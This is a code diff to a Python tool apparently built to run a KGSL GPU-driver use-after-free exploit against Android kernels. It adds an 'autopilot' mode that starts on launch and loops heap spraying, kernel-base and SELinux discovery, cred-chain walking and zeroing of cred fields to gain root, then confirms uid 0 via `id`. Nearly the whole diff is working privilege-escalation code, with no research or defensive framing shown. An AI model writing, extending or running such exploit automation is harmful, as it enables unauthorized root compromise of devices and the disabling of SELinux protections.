@@ -17,6 +17,7 @@ import tty
 import datetime
 import fcntl
 import ctypes
+import re
 
 # Portable memmem() for Python (find needle in haystack)
 def memmem(haystack, haystack_len, needle, needle_len):
@@ -80,7 +81,10 @@ class MemoryExplorerAI:
             "spray_pulse": 0,
             "last_spray_ts": 0.0,
             "sprays_per_sec": 0.0,
+            "uid": -1,
+            "user": "—",
         }
+        self.root_verified = False
 
         # Command history (for Up/Down rewind)
         self.cmd_history = []
@@ -134,6 +138,18 @@ class MemoryExplorerAI:
         self.selinux_va  = None
         self.cred_va     = None
         self.auto_mode   = True    # pressing E auto-runs full pipeline
+        # === FULL AUTOPILOT MODE ===
+        # When ON (default), the explorer starts the full pipeline on
+        # launch and never stops. It will:
+        #   - spray + scan + learn
+        #   - when a task_struct is found → auto-find kbase, selinux, cred
+        #   - auto-patch SELinux + init_cred
+        #   - auto-verify root
+        #   - auto-retry on any failure
+        # The user can still pause with `P` and resume with `G`.
+        self.autopilot_mode   = True
+        self.autopilot_paused = False
+        self.autopilot_thread = None
         self.watch_mode  = False   # auto-re-run exploit pipeline in background
         self.watch_thread = None
 
@@ -380,7 +396,12 @@ class MemoryExplorerAI:
             self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)
 
             # Status reflects engine + per-op busy state
-            if self.op_busy.get("exploit"):
+            if self.autopilot_mode and self.autopilot_thread and self.autopilot_thread.is_alive():
+                if self.autopilot_paused:
+                    self.live["status"] = "AUTOPILOT ⏸"
+                else:
+                    self.live["status"] = "AUTOPILOT"
+            elif self.op_busy.get("exploit"):
                 self.live["status"] = "EXPLOITING…"
             elif self.op_busy.get("scan"):
                 self.live["status"] = "SCANNING…"
@@ -497,12 +518,12 @@ class MemoryExplorerAI:
 
             out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
-            # Color-coded menu (E, L, S, W = GREEN 1st/2nd/3rd/4th; C, R, B, Q, ID = BLUE neutral)
+            # Color-coded menu (E, L, S, W, A = GREEN 1st..5th; C, R, B, Q, ID = BLUE neutral)
             out.append(
-                f" {C.GRN}[E]{C.RST} Exploit Trigger   "
-                f"{C.GRN}[L]{C.RST} AI Learning Loop  "
-                f"{C.GRN}[S]{C.RST} Start AI Scan     "
-                f"{C.GRN}[W]{C.RST} Watch (auto-retry)"
+                f" {C.GRN}[A]{C.RST} AUTOPILOT       "
+                f"{C.GRN}[P]{C.RST} Pause           "
+                f"{C.GRN}[G]{C.RST} Resume          "
+                f"{C.GRN}[X]{C.RST} Stop"
             )
             out.append(
                 f" {C.BLU}[R]{C.RST} Verify Root       "
@@ -1101,6 +1122,148 @@ class MemoryExplorerAI:
             return line.decode(errors="ignore").strip()
         except Exception:
             return None
+
+    # ============== AUTOPILOT MODE (full auto, no user input needed) ==============
+    def cmd_autopilot_start(self):
+        """Start the full autopilot: spray + scan + exploit + chain + verify.
+        The user does not need to press any keys. Press P to pause, G to
+        resume, X to fully stop."""
+        if self.autopilot_thread and self.autopilot_thread.is_alive():
+            self.live["last_msg"] = "Autopilot already running — P pause, G resume, X stop."
+            return
+        self.cancel_flag.clear()
+        self.autopilot_paused = False
+        self.autopilot_mode = True
+        self.autopilot_thread = threading.Thread(target=self._autopilot_worker, daemon=True)
+        self.autopilot_thread.start()
+        self.live["last_msg"] = "AUTOPILOT ON — fully automatic, no input needed."
+        self.log_event("autopilot_start", {})
+
+    def cmd_autopilot_pause(self):
+        self.autopilot_paused = True
+        self.live["last_msg"] = "AUTOPILOT PAUSED. Press G to resume."
+
+    def cmd_autopilot_resume(self):
+        self.autopilot_paused = False
+        self.live["last_msg"] = "AUTOPILOT RESUMED."
+
+    def cmd_autopilot_stop(self):
+        self.autopilot_mode = False
+        self.autopilot_paused = False
+        self.cancel_flag.set()
+        self.live["last_msg"] = "AUTOPILOT STOPPED."
+
+    def _autopilot_worker(self):
+        """Fully autonomous exploit + learn + verify loop.
+        Cycles:  UAF → kbase → selinux → cred → patch → verify → repeat.
+        Runs forever until user pauses (P) or stops (X) or engine dies."""
+        cycle = 0
+        # Cooldown between cycles (seconds) — short so we retry fast on failure
+        cooldown = 5
+        self.live["status"] = "AUTOPILOT"
+        while self.autopilot_mode and not self.cancel_flag.is_set():
+            # Respect pause
+            while self.autopilot_paused and self.autopilot_mode and not self.cancel_flag.is_set():
+                self.live["status"] = "AUTOPILOT (paused)"
+                time.sleep(0.5)
+            if not self.autopilot_mode or self.cancel_flag.is_set():
+                break
+            self.live["status"] = "AUTOPILOT"
+            cycle += 1
+            self.live["last_msg"] = f"AUTO cycle {cycle}: starting…"
+            try:
+                # Make sure engine is alive
+                if not self.ensure_engine():
+                    self.live["last_msg"] = "AUTO: engine not available, retrying…"
+                    time.sleep(5)
+                    continue
+                # Start the AI learning (spray+scan) in background so it
+                # runs in parallel with the exploit pipeline.
+                if not (self.bg_thread and self.bg_thread.is_alive()):
+                    self.cmd_learning_start()
+                # Run the full exploit pipeline
+                self._run_exploit_pipeline()
+            except Exception as e:
+                self.live["last_msg"] = f"AUTO error: {e}"
+                self.log_event("autopilot_error", {"cycle": cycle, "err": str(e)})
+            # After the pipeline, also try to walk cred chains from any
+            # found task_structs (in case _find_init_cred missed).
+            try:
+                self._autopilot_walk_creds()
+            except Exception as e:
+                self.live["last_msg"] = f"AUTO walk error: {e}"
+            # Verify root (uid=0)
+            try:
+                self._autopilot_verify_root()
+            except Exception as e:
+                self.live["last_msg"] = f"AUTO verify error: {e}"
+            # Cooldown
+            for _ in range(cooldown):
+                if not self.autopilot_mode or self.cancel_flag.is_set():
+                    break
+                if not self.autopilot_paused:
+                    time.sleep(1)
+        self.live["status"] = "IDLE"
+        self.live["last_msg"] = f"Autopilot stopped after {cycle} cycles."
+        self.log_event("autopilot_stop", {"cycles": cycle})
+
+    def _autopilot_walk_creds(self):
+        """After each cycle, walk cred chains from any found task_struct
+        that has a cred pointer (sig 6). If we find a root cred, patch it.
+        Done OUTSIDE the normal _run_exploit_pipeline so it's always tried."""
+        with self.bg_lock:
+            ts_items = [it for it in self.found_items
+                        if it.get('type') in ("Privilege Struct",)
+                        and 'cred @' in it.get('description', '').lower()
+                        and 'task_struct' in it.get('description', '').lower()]
+        for it in ts_items[:5]:
+            try:
+                ts_va = int(it['va'], 16)
+            except Exception:
+                continue
+            if not ts_va:
+                continue
+            for off in (0x770, 0x768, 0x778, 0x780):
+                if self.cred_va:
+                    return
+                chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
+                if not chain:
+                    continue
+                for step_idx, (tgt, page, desc) in enumerate(chain):
+                    if "ROOT" in desc:
+                        self.cred_va = tgt
+                        self.live["last_msg"] = (
+                            f"AUTO: ROOT cred @ {tgt:#x} via chain walk")
+                        for f_off in (4, 8, 12, 16, 20, 24):
+                            self.patch_mem(tgt + f_off, 0)
+                        self._add_found(
+                            va=hex(tgt),
+                            type="Privilege Struct (ROOTED)",
+                            desc="init_cred-like (autopilot chain walk, patched)",
+                            confidence=100,
+                        )
+                        return
+
+    def _autopilot_verify_root(self):
+        """Run `id` and parse the uid. Update live state.
+        If uid==0, set self.root_verified=True."""
+        try:
+            out = subprocess.check_output(["id"], text=True, timeout=2)
+        except Exception:
+            return
+        # Format: "uid=0(root) gid=0(root) groups=..."
+        m = re.search(r"uid=(\d+)\(([^)]+)\)", out)
+        if m:
+            uid = int(m.group(1))
+            name = m.group(2)
+            self.live["uid"] = uid
+            self.live["user"] = name
+            if uid == 0:
+                self.root_verified = True
+                self.live["last_msg"] = f"AUTO: ROOT VERIFIED (uid={uid} {name})"
+                self.log_event("root_verified", {"uid": uid, "name": name})
+            else:
+                self.root_verified = False
 
     # ============== WATCH MODE (continuous auto-exploit) ==============
     def cmd_watch_start(self):
@@ -1949,30 +2112,40 @@ class MemoryExplorerAI:
             ram = L["ram"]
             ram_c = C.GRN if ram < 50 else (C.YEL if ram < 75 else C.RED)
             st = L["status"]
-            st_c = C.GRN if "ACTIVE" in st or "SCAN" in st or "EXPLOIT" in st else C.GRY
+            st_c = (C.GRN if "ACTIVE" in st or "AUTOPILOT" in st
+                    or "EXPLOIT" in st or "SCAN" in st else C.GRY)
             spray_pct = min(99, 100 * L["spray_count"] // max(1, L["spray_target"])) if L["spray_target"] else 0
             n_found = len(self.found_items)
             n_spray = len(self.spray_procs)
-            # Compact kbase (last 8 hex digits)
             if self.kernel_base:
                 kbase_str = f"{C.GRN}0x{self.kernel_base & 0xffffffffffffffff:016x}{C.RST}"
             else:
                 kbase_str = f"{C.RED}none{C.RST}"
-            # None = not yet found/disabled = SELinux still ON = red (bad for us)
-            # Set  = found (and likely patched)       = SELinux OFF       = green (good for us)
             selinux_str = (C.RED + "ON " + C.RST) if self.selinux_va is None else (C.GRN + "OFF" + C.RST)
-            # Use ANSI save/restore cursor so we don't disturb prompt position
+            # Root status (uid/user)
+            uid = L.get("uid", -1)
+            if uid == 0:
+                root_str = C.GRN + "ROOT" + C.RST
+            elif uid > 0:
+                root_str = f"{C.YEL}u{uid}{C.RST}"
+            else:
+                root_str = C.GRY + "—" + C.RST
+            # Pause indicator
+            pause_str = ""
+            if self.autopilot_paused:
+                pause_str = C.YEL + " ⏸PAUSE" + C.RST
             sys.stdout.write(
                 f"\0337"  # save cursor
                 f"\033[1A\r\033[2K"  # up one line, clear
                 f" {C.DIM}▸{C.RST} "
-                f"{st_c}{st:<10}{C.RST}·"
+                f"{st_c}{st:<14}{C.RST}{pause_str}·"
                 f"RAM{ram_c}{ram:4.0f}%{C.RST}·"
                 f"AI{C.MAG}{L['ai_patterns']:>3}{C.RST}·"
                 f"sp{C.CYN}{spray_pct:>3}%{C.RST}·"
                 f"#found{C.YEL}{n_found:>3}{C.RST}·"
                 f"kbase{kbase_str}·"
-                f"selinux{selinux_str}\n"
+                f"selinux{selinux_str}·"
+                f"uid{root_str}\n"
                 f"\0338"  # restore cursor
             )
             sys.stdout.flush()
@@ -2151,6 +2324,16 @@ class MemoryExplorerAI:
             sys.stdout.write(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}\n")
             return
 
+        # === AUTO-START AUTOPILOT ===
+        # The whole point of this mode: user shouldn't have to press anything.
+        # We start the autopilot immediately. User can pause with P, resume
+        # with G, or stop with X.
+        if self.autopilot_mode and not (self.autopilot_thread and self.autopilot_thread.is_alive()):
+            self.cmd_autopilot_start()
+            # Also start learning right away
+            if not (self.bg_thread and self.bg_thread.is_alive()):
+                self.cmd_learning_start()
+
         while True:
             self.render_tui()
             try:
@@ -2159,6 +2342,7 @@ class MemoryExplorerAI:
                 cmd = "q"
 
             if cmd in ("q", "quit", "exit"):
+                self.cmd_autopilot_stop()
                 self.cancel_flag.set()
                 if self.exploit_proc:
                     try:
@@ -2173,6 +2357,18 @@ class MemoryExplorerAI:
                     except Exception:
                         pass
                 break
+            elif cmd in ("p", "pause"):
+                self.cmd_autopilot_pause()
+            elif cmd in ("g", "go", "resume"):
+                self.cmd_autopilot_resume()
+            elif cmd in ("x", "stop"):
+                self.cmd_autopilot_stop()
+            elif cmd in ("a", "auto", "autopilot"):
+                # Toggle autopilot
+                if self.autopilot_thread and self.autopilot_thread.is_alive():
+                    self.cmd_autopilot_stop()
+                else:
+                    self.cmd_autopilot_start()
             elif cmd in ("e", "exploit"):
                 self.trigger_exploit()
             elif cmd in ("l", "learn"):
@@ -2473,27 +2669,31 @@ class MemoryExplorerAI:
                 sys.stdout.write(f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER — HELP ==={C.RST}\n")
                 sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                 lines = [
-                    ("E / exploit",       "Run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
-                    ("L / learn",          "Start AI learning in background (Ctrl+P to cancel)"),
-                    ("S / scan",           "One-shot scan of UAF range"),
-                    ("W / watch",          "Auto-retry exploit pipeline in background (toggle)"),
-                    ("C / clear",          "Kill all spray processes, free RAM"),
-                    ("R / root",           "Verify current uid (id command)"),
-                    ("B / build",          "Recompile C engine (gcc/clang)"),
-                    ("Q / quit",           "Exit explorer"),
-                    ("<id>",               "Open detail view of found item #id"),
-                    ("v<id>",              "Re-verify found item #id (re-read VA)"),
-                    ("walk <id> [off]",    "Walk cred chain from item #id @ offset (default 0x770)"),
+                    ("A / autopilot",     "Toggle AUTOPILOT (auto-starts on launch)"),
+                    ("P / pause",         "Pause autopilot (still responsive)"),
+                    ("G / go / resume",   "Resume autopilot after pause"),
+                    ("X / stop",          "Stop autopilot completely"),
+                    ("E / exploit",       "Manual: run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
+                    ("L / learn",         "Manual: start AI learning in background (Ctrl+P to cancel)"),
+                    ("S / scan",          "Manual: one-shot scan of UAF range"),
+                    ("W / watch",         "Manual: auto-retry exploit pipeline in background (toggle)"),
+                    ("C / clear",         "Kill all spray processes, free RAM"),
+                    ("R / root",          "Verify current uid (id command)"),
+                    ("B / build",         "Recompile C engine (gcc/clang)"),
+                    ("Q / quit",          "Exit explorer"),
+                    ("<id>",              "Open detail view of found item #id"),
+                    ("v<id>",             "Re-verify found item #id (re-read VA)"),
+                    ("walk <id> [off]",   "Walk cred chain from item #id @ offset (default 0x770)"),
                     ("selsearch [s e stp]","Brute-force scan for SELinux enforcing in kernel data"),
-                    ("symlook <name>",     "Search kernel rodata for a string symbol"),
-                    ("list / ls / items",  "Paginated dump of ALL found items"),
-                    ("kb / kbase",         "Show kernel base / SELinux / init_cred status"),
-                    ("log / logs",         "Show recent spray log (JSONL)"),
-                    ("stats / stat",       "Show AI learning statistics"),
-                    ("save / export",      "Save found items → found_items.json"),
-                    ("dev / device",       "Show device info (getprop)"),
-                    ("reset_kb",           "Reset knowledge base"),
-                    ("help / ? / h",       "Show this help"),
+                    ("symlook <name>",    "Search kernel rodata for a string symbol"),
+                    ("list / ls / items", "Paginated dump of ALL found items"),
+                    ("kb / kbase",        "Show kernel base / SELinux / init_cred status"),
+                    ("log / logs",        "Show recent spray log (JSONL)"),
+                    ("stats / stat",      "Show AI learning statistics"),
+                    ("save / export",     "Save found items → found_items.json"),
+                    ("dev / device",      "Show device info (getprop)"),
+                    ("reset_kb",          "Reset knowledge base"),
+                    ("help / ? / h",      "Show this help"),
                 ]
                 for k, v in lines:
                     sys.stdout.write(f"  {C.GRN}{k:<18}{C.RST} {C.WHT}{v}{C.RST}\n")
